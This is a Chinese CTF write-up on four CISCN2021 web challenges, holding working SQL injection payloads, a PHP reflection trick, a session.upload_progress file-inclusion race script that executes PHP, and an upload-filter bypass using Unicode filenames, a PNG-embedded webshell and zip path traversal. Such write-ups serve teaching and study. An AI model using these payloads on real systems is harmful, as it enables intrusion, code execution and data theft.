title: CISCN2021-web之旅
author: bmth
tags:
  - CISCN2021
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210517224756982.png'
date: 2021-05-18 15:35:00
---
## easy_sql
使用sqlmap跑出来了库名和表名
![](https://img-blog.csdnimg.cn/20210517224822800.png)
使用报错注入语句
```sql
') and extractvalue(2516,concat(0x7e,(select database()),0x7e))-- 
```
![](https://img-blog.csdnimg.cn/20210517224850681.png)
得到数据库名。但发现是无列名注入，过滤了union，参考文章：[sql注入中的其他姿势 ](https://www.cnblogs.com/wangtanzhi/p/12594949.html#autoid-0-15-0)
在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错
```sql
') and extractvalue(2516,concat(0x7e,(select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c)),0x7e))-- 
```
![](https://img-blog.csdnimg.cn/20210517225033859.png)
得到password
那么同理就可以得到flag的列名了
```sql
') and extractvalue(2516,concat(0x7e,(select * from flag where id=2 and (select * from (select * from flag as a join flag as b using(id,no)) as c)),0x7e))-- 
```
![](https://img-blog.csdnimg.cn/20210517225124857.png)
最后直接读取即可，字段存在数字注意使用`
```sql
') and extractvalue(2516,concat(0x7e,(select `0c20652d-dfd7-4610-a3bb-b0e9cc8fcacb` from flag),0x7e))-- 
```
由于extractvalue读取不完全，截取一下即可
```sql
') and extractvalue(2516,concat(0x7e,(select mid(`0c20652d-dfd7-4610-a3bb-b0e9cc8fcacb`,1,10) from flag),0x7e))-- 
```
得到flag
![](https://img-blog.csdnimg.cn/20210517225208763.png)
## easy_source
直接.index.php.swo得到源码
```php
<?php
class User
{
    private static $c = 0;
    function a()
    {
        return ++self::$c;
    }
    function b()
    {
        return ++self::$c;
    }
    function c()
    {
        return ++self::$c;
    }
    function d()
    {
        return ++self::$c;
    }
    function e()
    {
        return ++self::$c;
    }
    function f()
    {
        return ++self::$c;
    }
    function g()
    {
        return ++self::$c;
    }
    function h()
    {
        return ++self::$c;
    }
    function i()
    {
        return ++self::$c;
    }
    function j()
    {
        return ++self::$c;
    }
    function k()
    {
        return ++self::$c;
    }
    function l()
    {
        return ++self::$c;
    }
    function m()
    {
        return ++self::$c;
    }
    function n()
    {
        return ++self::$c;
    }
    function o()
    {
        return ++self::$c;
    }
    function p()
    {
        return ++self::$c;
    }
    function q()
    {
        return ++self::$c;
    }
    function r()
    {
        return ++self::$c;
    }
    function s()
    {
        return ++self::$c;
    }
    function t()
    {
        return ++self::$c;
    }
    
}
$rc=$_GET["rc"];
$rb=$_GET["rb"];
$ra=$_GET["ra"];
$rd=$_GET["rd"];
$method= new $rc($ra, $rb);
var_dump($method->$rd());
?>
```
原题。。。。。。。。
[fslh-writeup](https://r0yanx.com/2020/10/28/fslh-writeup/)
flag 是藏在类的注释中，我们能够实例化任意类，并调用类方法，那么就可以利用 PHP 内置类中的`ReflectionMethod`来读取`User`类里面各个函数的注释 
爆破出来q得到flag
![](https://img-blog.csdnimg.cn/20210517225410666.png)
## middle_source
```php
<?php
    highlight_file(__FILE__);
    echo "your flag is in some file in /etc ";
    $fielf=$_POST["field"];
    $cf="/tmp/app_auth/cfile/".$_POST['cf'];
    
    if(file_exists($cf)){
        include $cf;
        echo $$field;
        exit;
    }
    else{
        echo "";
        exit;
    }
?>
```
可以读取
```
/etc/apache2/sites-available/000-default.conf
/etc/apache2/apache2.conf
/etc/apache2/envvars
```
但发现读取不了日志文件，使用dirseach爆破工具爆破文件
![](https://img-blog.csdnimg.cn/20210517225450227.png)
发现`.listing`，得到`you_can_seeeeeeee_me.php`
![](https://img-blog.csdnimg.cn/20210517225522520.png)
发现是phpinfo,得到session路径
![](https://img-blog.csdnimg.cn/20210517225535858.png)
那么利用session.upload_progress将恶意语句写入session文件，从而包含session文件然后进行访问
参考文章：[利用session.upload_progress进行文件包含和反序列化渗透](https://www.freebuf.com/vuls/202819.html)
发现存在disable_functions，使用scandir进行读取
```python
import io
import requests
import threading

sessID = 'bmth'
url = 'http://123.60.215.79:21776'

data = {
    "cf":"../../../../../../var/lib/php/sessions/jbgjccdcbb/sess_{}".format(sessID)
}

def write(session):
    while True:
        f = io.BytesIO(b'a'*256*1)
        response = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php var_dump(scandir("/etc/"));echo("bmth");?>'},
            files={'file': ('bmth.txt', f)}
            )
def read():
    while True:
        response = session.post(url,data)
        if 'bmth' in response.text:
            print(response.text)
            break

session = requests.session()
write = threading.Thread(target=write, args=(session,))
write.daemon = True 
write.start()
read()
```
![](https://img-blog.csdnimg.cn/20210517225702646.png)
发现奇怪的名称cadahdeiff，那么读取目录，最后readfile读取flag即可
```php
readfile("/etc/cadahdeiff/aidacbeeef/hhbecfhbgf/fedajbafee/dbieffcbee/fl444444g");
```
![](https://img-blog.csdnimg.cn/20210517225727522.png)

## upload复现
[https://buuoj.cn/challenges#[CISCN2021%20Quals]upload](https://buuoj.cn/challenges#[CISCN2021%20Quals]upload)
比赛时候没做出来，比赛完来学习一下
```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="upload") {
    if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }
    $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
    if ($imageinfo === FALSE) {
        die("如果不能好好传图片的话就还是不要来打扰我了");
    }
    if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
    $fileName=urldecode($_FILES['postedFile']['name']);
    if(stristr($fileName,"c") || stristr($fileName,"i") || stristr($fileName,"h") || stristr($fileName,"ph")) {
        die("有些东西让你传上去的话那可不得了");
    }
    $imagePath = "image/" . mb_strtolower($fileName);
    if(move_uploaded_file($_FILES["postedFile"]["tmp_name"], $imagePath)) {
        echo "upload success, image at $imagePath";
    } else {
        die("传都没有传上去");
    }
}
```
发现存在以下过滤
1. 上传需要绕过getimagesize
2. 图片的长宽必须为1
3. 文件名不能有c、i、h、ph

绕过`getimagesize`可以使用
```
#define width 1
#define height 1
```
这里c、i、h、ph直接把我卡死了，其实在生成文件名时用了`mb_strtolower()`函数
![](https://img-blog.csdnimg.cn/20210524124357283.png)
部分字母在经过`mb_strtolower`处理过可以等效普通字母的，如`i`可以用`%C4%B0`代替
文章：[https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/](https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/)
![](https://img-blog.csdnimg.cn/20210524125018531.png)
测试在php7.3.5及以上版本为false
扫描目录发现存在example.php：
```php
<?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```
发现可以解压zip，正好`i`可以使用`İ`绕过，这里需要绕过`imagecreatefrompng`，`imagepng`，如果直接在图片最后写一个一句话木马，会被GD库给去掉，使用脚本生成，[https://github.com/huntergregal/PNG-IDAT-Payload-Generator/](https://github.com/huntergregal/PNG-IDAT-Payload-Generator/)
![](https://img-blog.csdnimg.cn/20210524130336608.png)
修改图片后缀为php并压缩，上传并修改文件名，添加长度绕过的字符串
![](https://img-blog.csdnimg.cn/20210524132051646.png)
上传成功，最后解压文件，`file=../image/aaa.zip`，文件在example目录下
![](https://img-blog.csdnimg.cn/20210524132916827.png)

参考：
[php imagecreatefrom* 系列函数之 png – janes](http://www.vuln.cn/6411)
[CISCN2021-upload](https://www.plasf.cn/articles/CISCN2021upload.html)